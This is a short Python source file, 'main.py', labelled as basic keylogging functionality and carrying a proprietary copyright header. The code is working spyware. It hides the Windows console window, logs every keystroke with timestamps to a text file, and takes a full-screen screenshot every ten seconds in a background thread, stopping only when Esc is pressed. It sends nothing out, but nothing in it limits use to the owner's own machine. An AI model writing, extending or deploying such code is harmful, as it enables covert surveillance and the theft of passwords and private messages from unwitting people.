"""
Basic Keylogging functionality
"""
#*****************************************************************************# pylint: disable=duplicate-code
#                    C O P Y R I G H T  (c) 2024
#                     D A R R E N   M O R R I S O N
#                         All Rights Reserved
#*****************************************************************************#
# THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF DARREN MORRISON.
# THIS SOFTWARE IS PROVIDED IN AN 'AS IS' CONDITION. NO WARRANTIES, WHETHER
# EXPRESS, IMPLIED OR STATUTORY, INCLUDING, BUT NOT LIMITED TO, IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE APPLY TO
# THIS SOFTWARE. THE COMPANY SHALL NOT, IN ANY CIRCUMSTANCES, BE LIABLE FOR
# SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES, FOR ANY REASON WHATSOEVER.
#
#            The copyright notice above does not evidence any
#           actual or intended publication of such source code.
#
# The software is owned by Darren Morrison. and/or its supplier,
# and is protected under applicable copyright laws. All rights are reserved.
# Any use in violation of the foregoing restrictions may subject the user to
# criminal sanctions under applicable laws, as well as to civil liability for
# the breach of the terms and conditions of this license.
#*****************************************************************************#
#*****************************************************************************#
__file__      = "main.py"
__copyright__ = "COPYRIGHT (c) 2024 Darren Morrison. All rights reserved"
__author__    = "Darren Morrison"
__version__   = "0.0.1"
#*****************************************************************************# pylint: enable=duplicate-code
import os
import sys
from pynput.keyboard import Key, Listener
from datetime import datetime
import time
import threading
from PIL import ImageGrab

def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(f"screenshot_{int(time.time())}.png")

def screenshot_timer(interval):
    while True:
        capture_screenshot()
        time.sleep(interval)

def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_press(key):
    with open("log.txt", "a") as log_file:
        try:
            log_file.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            log_file.write(f"{datetime.now()} - [{key}]\n")

def on_release(key):
    if key == Key.esc:
        return False
    
if __name__ == "__main__":
    hide_console()

    screenshot_interval = 10  # Interval in seconds
    threading.Thread(target=screenshot_timer, args=(screenshot_interval,), daemon=True).start()

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
